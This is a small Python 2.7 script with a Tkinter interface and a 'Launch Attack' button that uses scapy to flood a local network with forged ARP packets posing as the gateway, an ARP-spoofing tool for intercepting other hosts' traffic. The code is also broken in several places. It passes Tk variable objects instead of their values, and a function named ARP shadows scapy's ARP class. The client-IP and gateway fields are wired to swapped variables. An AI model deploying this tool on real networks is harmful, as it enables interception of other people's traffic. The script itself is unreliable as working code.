#!/usr/bin/python2.7
#-*- coding: utf-8 -*-

#################################################
#Title : ARP grahic 							#
#DAte : 06/09/2017								#
#Author : GrandPa								#
################################################# 

#################################################
#Import externals functions: 
from scapy.all import *
from Tkinter import *
from tkMessageBox import *
#################################################
#Def local or global: 

def recupere():
    showinfo("Alerte", entree.get())

#################################################
#Programm Body:

windows = Tk()
windows.wm_resizable(0, 0)
frame = frame = Frame(windows)
label = Label(frame, text="MAC Address").pack(side=LEFT)
#dst = Entry(frame)
#dst.pack(side=LEFT, fill=X, expand=True)
clientMAC = StringVar() 
clientMAC.set("")  
entree = Entry(frame, textvariable=clientMAC, width=30)
entree.pack(side=LEFT, fill=X, expand=True)
frame.pack(fill=X, expand=True)

frame = frame = Frame(windows)
label = Label(frame, text="IP CLient").pack(side=LEFT)
gateway = StringVar() 
gateway.set("")  
entree = Entry(frame, textvariable=gateway, width=30)
entree.pack(side=LEFT, fill=X, expand=True)
frame.pack(fill=X, expand=True)

frame = frame = Frame(windows)
label = Label(frame, text="Gateway").pack(side=LEFT)
client = StringVar() 
client.set("")  
entree = Entry(frame, textvariable=client, width=30)
entree.pack(side=LEFT, fill=X, expand=True)
frame.pack(fill=X, expand=True)

def ARP():
	send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
      inter=RandNum(10,40), loop=1 )

frame = frame = Frame(windows)
button = Button(frame, text="Launch Attack", command=ARP)

frame.pack(fill=X)

frame2 = frame2 = Frame(windows)
scrollbar = Scrollbar(frame2)
scrollbar.pack(side=RIGHT, fill=Y)

textbox = Text(frame2)
textbox.pack(side=RIGHT, fill=BOTH, expand=True)
textbox.config(yscrollcommand=scrollbar.set)
scrollbar.config(command=textbox.yview)
frame2.pack(fill=BOTH, expand=True)

button.pack()
frame.pack()
windows.mainloop()

#print entree.pack

